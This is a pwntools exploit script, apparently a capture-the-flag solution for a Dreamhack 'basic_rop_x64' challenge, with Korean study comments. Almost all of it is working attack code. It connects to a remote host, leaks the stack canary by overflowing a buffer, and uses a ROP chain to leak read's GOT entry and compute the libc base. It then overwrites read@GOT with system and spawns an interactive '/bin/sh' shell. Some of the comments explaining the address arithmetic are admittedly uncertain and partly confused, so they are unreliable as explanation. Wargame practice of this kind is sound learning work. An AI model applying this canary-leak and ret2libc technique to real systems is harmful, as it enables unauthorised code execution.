from pwn import *
def slog(name, addr):
        return success(": ".join([name, hex(addr)]))
#p = process("./rop")    
p = remote("host3.dreamhack.games",17422)
e = ELF("./rop")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("/home/alsshsskssl/study/basic_rop_x64/libc.so.6")
# [1] Leak canary
buf = b"A"*0x39
p.sendafter("Buf: ", buf)
p.recvuntil(buf)
cnry = u64(b"\x00"+p.recvn(7))
slog("canary", cnry)

# [2] Exploit
read_plt = e.plt['read']
read_got = e.got['read']
puts_plt = e.plt['puts']
pop_rdi = 0x00000000004007f3
pop_rsi_r15 = 0x00000000004007f1
payload = b"A"*0x38 + p64(cnry) + b"B"*0x8

# puts(read_got)
payload += p64(pop_rdi) + p64(read_got)
payload += p64(puts_plt)

# read(0, read_got, 0x10)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(read_plt)


# read("/bin/sh") == system("/bin/sh")
payload += p64(pop_rdi)
payload += p64(read_got+0x8)
payload += p64(read_plt)
#gdb.attach(p)


p.sendafter("Buf: ", payload)
read = u64(p.recvn(6)+b"\x00"*2)        #puts로 출력된 read_got를 받아서 read에 저장
lb = read - libc.symbols["read"]        #read_got - libc.symbols["read"]이러면 read_plt시작부터 얼마나 뒤에read_got가 있는지 나옴?? 정확하진 않음
system = lb + libc.symbols["system"]    #system_plt에서 system_got의 위치를 구하는거지! 상대주소는 같으니까,system=system_got가 됨
#slog("read", read)
#slog("libc base", lb)
#slog("system", system)

p.send(p64(system)+b"/bin/sh\x00")      #read(0,read_got,0x10) 호출했을 때 사용자입력에 system_got를 넣는거임 그리고 rdx가 충분히 크게 설정되있어서 /bin/sh문자열도 뒤에 8바이트 추가로 넣어둠 그럼 나중에 꺼내쓸 수 있으니까
                                        #그러면 다음에 read_plt호출하면 read_got가 system_got로 설정되어있어서 system_got가 호출됨

p.interactive()

